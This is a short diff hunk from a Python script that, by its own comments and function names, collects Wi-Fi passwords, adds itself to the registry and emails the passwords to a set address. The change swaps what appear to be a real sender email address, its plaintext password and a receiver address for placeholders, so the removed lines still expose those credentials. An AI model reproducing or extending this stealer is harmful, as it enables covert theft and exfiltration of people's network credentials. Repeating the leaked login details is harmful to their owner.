@@ -68,9 +68,9 @@ def add_to_registry(executable_path):
 
 # Function to send an email with the collected Wi-Fi passwords
 def send_email(wifi_data_str):
-    sender_email = "gagan.21cse219@rtu.ac.in"
-    sender_password = "12345gaganjha"  # Use your App Password or regular password if 2FA is not enabled
-    receiver_email = "gjha20367@gmail.com"
+    sender_email = "your-email-id"
+    sender_password = "password"  # Use your App Password or regular password if 2FA is not enabled
+    receiver_email = "sender-email-id"
     subject = "Wi-Fi Passwords"
 
     msg = MIMEMultipart()
